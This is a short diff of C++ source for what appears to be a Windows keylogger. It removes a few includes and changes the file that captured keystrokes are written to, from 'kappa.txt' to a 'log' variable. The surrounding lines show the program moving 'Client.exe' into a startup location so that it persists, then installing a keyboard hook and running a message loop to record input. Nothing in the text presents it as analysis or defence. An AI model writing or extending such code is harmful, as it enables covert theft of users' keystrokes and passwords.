@@ -1,8 +1,4 @@
-#define WIN32_LEAN_AND_MEAN
-
 #include "KeyboardHook.h"
-#include"vector"
-#include <iostream>
 #include <filesystem>
 
 namespace fs = std::filesystem;
@@ -34,7 +30,7 @@ int main(){
 		rename("Client.exe", startup);
 	}
 
-    SetHook("kappa.txt");
+    SetHook(log);
 
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0)){
